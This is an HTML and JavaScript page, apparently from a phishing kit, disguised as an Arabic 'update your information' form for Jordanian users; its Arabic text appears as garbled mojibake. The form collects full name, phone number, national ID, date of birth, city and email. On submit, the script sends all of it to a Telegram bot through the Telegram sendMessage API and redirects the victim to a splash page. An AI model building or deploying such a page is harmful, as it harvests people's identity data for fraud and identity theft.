<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</title>
<style>
:root{ --accent:#ff5a00; --bar:#2b2e36; --maxw:520px; --btn-height:64px }
html,body{min-height:100vh;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#000;-webkit-text-size-adjust:100%;}
/* Ø§Ù„Ø¨Ø§Ø± Ø§Ù„Ø¹Ù„ÙˆÙŠ */
.top-bar{background:var(--bar);color:#fff;padding:14px 16px;text-align:center;position:fixed;top:0;left:0;right:0;height:56px;display:flex;align-items:center;justify-content:center;z-index:9999;box-sizing:border-box;}   
.top-bar::after{content:"";display:block;height:3px;background:var(--accent);position:absolute;bottom:0;left:0;right:0}
.back-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:22px;color:#fff;text-decoration:none}
.container{max-width:var(--maxw);margin:0 auto;padding:calc(56px + env(safe-area-inset-top) + 12px) 16px calc(18px + var(--btn-height));box-sizing:border-box} 

h2{text-align:center;margin:6px 0 12px 0;font-size:20px}
label{display:block;margin:12px 0 6px;font-size:15px}
label[for="phone"]{text-align:right}
.input-row{display:flex;gap:12px;flex-wrap:wrap}

/* Ø­Ø¬ÙˆÙ… Ø§Ù„Ù…Ø±Ø¨Ø¹Ø§Øª ÙˆØ­Ù…Ø§ÙŠØ© Ù…Ù† Ø®Ø§ØµÙŠØ© ØªÙƒØ¨ÙŠØ± Ø§Ù„Ù…ØªØµÙØ­ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„: Ø§Ø¬Ø¹Ù„ Ø­Ø¬Ù… Ø§Ù„Ø®Ø· >=16px */
input[type="text"],input[type="tel"],input[type="email"],input[type="date"],select{
  width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;background:#fff;
}

/* ØªØ£ÙƒÙŠØ¯ Ø£Ù† Ø¹Ù†Ø§ØµØ± Ø§Ù„ØªØ­ÙƒÙ… Ù„Ø§ ØªØ³Ø¨Ø¨ ØªÙƒØ¨ÙŠØ± Ø§Ù„ØµÙØ­Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ±ÙƒÙŠØ² */
input, select, textarea { -webkit-text-size-adjust:100%; }

/* ØªØ­Ø³ÙŠÙ† Ù…Ø¸Ù‡Ø± select Ù„ÙŠØªÙ†Ø§Ø³Ø¨ Ù…Ø¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ */
select{appearance:none;-webkit-appearance:none;background-image:linear-gradient(45deg, transparent 50%, #999 50%), linear-gradient(135deg, #999 50%, transparent 50%);background-position: calc(100% - 18px) calc(1em + 2px), calc(100% - 13px) calc(1em + 2px);background-size: 6px 6px, 6px 6px;background-repeat: no-repeat;padding-right:36px}

/* Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ ØµØºÙŠØ±Ø© */
.field-error{color:#d23;font-size:13px;margin-top:6px;display:none}

/* ØªÙ†Ø³ÙŠÙ‚ Ù„Ø­Ù‚Ù„ Ø§Ù„ØªØ§Ø±ÙŠØ® Ù„ÙŠØ´Ø¨Ù‡ Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ù…Ø±Ø¨Ø¹Ø§Øª */
input[type="date"]::-webkit-calendar-picker-indicator{filter:invert(1)}
input[type="date"]{appearance:none;-webkit-appearance:none}

/* Ø²Ø± Ø¯Ø§Ø®Ù„ Ø§Ù„ØªØ¯ÙÙ‚ (static) Ù„ÙŠÙ…Ù†Ø¹ ØªØ­Ø±ÙŠÙƒ Ø§Ù„ØµÙØ­Ø© Ø¹Ù†Ø¯ ÙØªØ­ Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­ */
.btn{height:var(--btn-height);width:calc(100% - 32px);max-width:var(--maxw);padding:12px;border:none;border-radius:10px;background:var(--accent);color:#fff;font-size:18px;position:static;margin:18px auto 32px;transform:none;cursor:not-allowed;box-shadow:0 6px 20px rgba(0,0,0,0.06);display:flex;align-items:center;justify-content:center}
.btn.active{cursor:pointer;background:#e44a00}

.suggest-note{font-size:13px;color:#666;margin-top:6px}
.form-row{margin-bottom:12px}

/* responsive tweaks for small phones */
@media (max-width:520px){
  :root{--maxw:420px}
  .container{padding:12px 12px calc(12px + var(--btn-height))}
  h2{font-size:18px}
  input[type="text"],input[type="tel"],input[type="email"],input[type="date"],select{font-size:17px;padding:14px}
  .back-btn{font-size:20px}
}
</style>
</head>
<body>
<div class="top-bar">
ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
<a class="back-btn" href="verethad.html">â€¹</a>
</div>

<div class="container">
  <h2>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</h2>
  <form id="infoForm" autocomplete="on">
    <div class="form-row">
      <label for="name">Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</label>
      <input type="text" id="name" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„" required>
    </div>

    <div class="form-row">
      <label for="phone">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
      <input type="tel" id="phone" placeholder="07xxxxxxxx" inputmode="tel" maxlength="10" required>
      <div id="phoneError" class="field-error">ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ¨Ø¯Ø£ Ø¨Ø±Ù‚Ù… 07 ÙˆÙŠØªÙƒÙˆÙ† Ù…Ù† 10 Ø£Ø±Ù‚Ø§Ù… (Ù…Ø«Ø§Ù„: 0791234567)</div>
    </div>

    <div class="form-row">
      <label for="nationalId">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
      <!-- Ù†Ø³Ù…Ø­ Ø¨Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· ÙˆÙ†Ø­Ø¯Ø¯ Ø·ÙˆÙ„ Ø£Ù‚ØµÙ‰ 10 (ÙŠÙ…ÙƒÙ† ØªØºÙŠÙŠØ±Ù‡) -->
      <input type="text" id="nationalId" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" inputmode="numeric" maxlength="10" required>
      
    </div>

    <div class="form-row">
      <label for="dob">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
      <input type="date" id="dob" required>
      <div id="dobFormatted" class="suggest-note"></div>
    </div>

    <div class="form-row">
      <label for="city">Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©</label>
      <select id="city" required>
        <option value="">Ø§Ø®ØªØ± Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©</option>
        <option>Ø¹Ù…Ø§Ù†</option>
        <option>Ø¥Ø±Ø¨Ø¯</option>
        <option>Ø§Ù„Ø²Ø±Ù‚Ø§Ø¡</option>
        <option>Ø§Ù„Ø³Ù„Ø·</option>
        <option>Ø¬Ø±Ø´</option>
        <option>Ø¹Ø¬Ù„ÙˆÙ†</option>
        <option>Ù…Ø§Ø¯Ø¨Ø§</option>
        <option>Ø§Ù„ÙƒØ±Ùƒ</option>
        <option>Ù…Ø¹Ø§Ù†</option>
        <option>Ø§Ù„Ù…ÙØ±Ù‚</option>
        <option>Ø§Ù„Ø·ÙÙŠÙ„Ø©</option>
        <option>Ø§Ù„Ø¹Ù‚Ø¨Ø©</option>
        <option>Ø§Ù„Ø±Ù…Ø«Ø§</option>
        <option>Ø§Ù„Ø±ØµÙŠÙØ©</option>
        <option>Ø¯ÙŠØ± Ø¹Ù„Ø§</option>
        <option>Ø³Ø­Ø§Ø¨</option>
        <option>Ø§Ù„Ø¹Ø±Ø¬Ø§Ù†</option>
        <option>Ø§Ù„Ù…Ø²Ø§Ø±</option>
        <option>Ø§Ù„Ø´ÙˆÙ†Ø© Ø§Ù„Ø´Ù…Ø§Ù„ÙŠØ©</option>
        <option>Ø¨ØµÙŠØ±Ø§</option>
        <option>Ø§Ù„Ù‚Ø³Ø·Ù„</option>
        <option>Ø§Ù„Ø­Ù†Ù‘Ù‘Ø§</option>
        <option>Ø§Ù„ÙƒÙ…Ø§Ù„ÙŠØ©</option>
        <option>Ø§Ù„Ø¨Ù‚Ø¹Ø©</option>
        <option>Ø§Ù„Ù…ÙˆÙ‚Ø±</option>
      </select>
    </div> 

    <div class="form-row">
      <label for="email">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
      <input type="email" id="email" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
    </div>

    <button type="submit" id="submitBtn" class="btn">Ø§Ù„ØªØ§Ù„ÙŠ</button>
  </form>
</div>

<!-- ØªØ­Ù…ÙŠÙ„ Google Places API (Ø§Ø³ØªØ¨Ø¯Ù„ YOUR_GOOGLE_API_KEY Ø¨Ù…ÙØªØ§Ø­Ùƒ) -->

<script>
// DOM
const form = document.getElementById('infoForm');
const btn = document.getElementById('submitBtn');
const nameInput = document.getElementById('name');
const phoneInput = document.getElementById('phone');
const nationalId = document.getElementById('nationalId');
const dob = document.getElementById('dob');
const citySelect = document.getElementById('city');
const emailInput = document.getElementById('email');

// Ø¶Ø¨Ø· Ø­Ø¯ Ø§Ù„ØªØ§Ø±ÙŠØ®: ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… 18 Ø³Ù†Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„
(function setDobLimits(){
  const today = new Date();
  const maxYear = today.getFullYear() - 18;
  const maxDate = new Date(today);
  maxDate.setFullYear(maxYear);
  const minDate = new Date(today);
  minDate.setFullYear(maxYear - 82);
  function toYMD(d){ return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0'); }
  dob.max = toYMD(maxDate);
  dob.min = toYMD(minDate);
})();

// ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ø²Ø±
function updateButtonState(){
  const nameOk = !!nameInput.value.trim();
  const phoneOk = !!phoneInput.value.trim();
  const nationalOk = !!nationalId.value.trim();
  const cityOk = !!citySelect.value.trim();
  const emailOk = !!emailInput.value.trim();
  const dobOk = !!dob.value && new Date(dob.value) <= new Date(dob.max);
  const all = nameOk && phoneOk && nationalOk && cityOk && emailOk && dobOk;
  if(all){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
}
[nameInput,phoneInput,nationalId,citySelect,emailInput,dob].forEach(el=>el.addEventListener('input', updateButtonState));

// Ø¬Ø¹Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· (Ù…Ø¹ Ø¯Ø¹Ù… Ø§Ù„Ù„ØµÙ‚)
nationalId.addEventListener('keydown', (e) => { const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if (allowed.includes(e.key)) return; if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/[^0-9]/g,'').slice(0,nationalId.maxLength); updateButtonState(); });

// Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¹Ù…Ø± Ø«Ù… Ø£Ø±Ø³Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù… Ø«Ù… Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
const BOT_TOKEN = 'Ø¶Ø¹_ØªÙˆÙƒÙ†_Ø§Ù„Ø¨ÙˆØª_Ù‡Ù†Ø§';
const CHAT_ID = 'Ø¶Ø¹_ChatID_Ù‡Ù†Ø§';
// ØªÙ‚ÙŠÙŠØ¯ Ø­Ù‚Ù„ Ø§Ù„Ù‡Ø§ØªÙ Ù„Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· Ù…Ø¹ Ø¯Ø¹Ù… Ø§Ù„Ù„ØµÙ‚
phoneInput.addEventListener('input', ()=>{ phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); updateButtonState(); });
phoneInput.addEventListener('keydown', (e)=>{ const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if(allowed.includes(e.key)) return; if(e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
phoneInput.addEventListener('paste',(e)=>{ e.preventDefault(); const paste=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'').slice(0,10); phoneInput.value=paste; updateButtonState(); });

form.addEventListener('submit', function(e){
  e.preventDefault();
  if(btn.disabled) return;
  // ØªØ­Ù‚Ù‚ Ø§Ù„Ø¹Ù…Ø±
  const dobVal = dob.value;
  if(!dobVal){ alert('ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯'); return; }
  if(new Date(dobVal) > new Date(dob.max)){ alert('ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø§Ù„Ø¹Ù…Ø± 18 Ø³Ù†Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„'); return; }

  const data = {
    name: nameInput.value.trim(),
    phone: phoneInput.value.trim(),
    nationalId: nationalId.value.trim(),
    dob: dob.value.split('-').join('/'), // YYYY/MM/DD
    city: citySelect.value.trim(),
    email: emailInput.value.trim()
  };
  const text = `ğŸ“‹ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª:
ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${data.name}
ğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}
ğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${data.nationalId}
ğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${data.dob}
ğŸ™ï¸ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${data.city}
ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: ${data.email}`;
  if (!BOT_TOKEN || BOT_TOKEN.includes('Ø¶Ø¹_ØªÙˆÙƒÙ†') || !CHAT_ID || CHAT_ID.includes('Ø¶Ø¹_ChatID')){
    alert('ØªÙ†Ø¨ÙŠÙ‡: Ù„Ù… ØªÙ‚Ù… Ø¨Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙˆØª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… ÙÙŠ Ø§Ù„ÙƒÙˆØ¯. Ø³ÙŠØªÙ… Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªÙŠØ¬Ø© Ù…Ø­Ù„ÙŠÙ‹Ø§.');
    console.log('payload ->', text);
    window.location.href = 'splash1.html';
    return;
  }
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  })
  .then(res => res.json())
  .then(resp => {
    if(resp && resp.ok){ window.location.href = 'splash1.html'; }
    else{ alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù….'); console.error('telegram response', resp); }
  })
  .catch(err => { alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„'); console.error(err); });
});

// initial
updateButtonState();
</script>
</body>
</html>
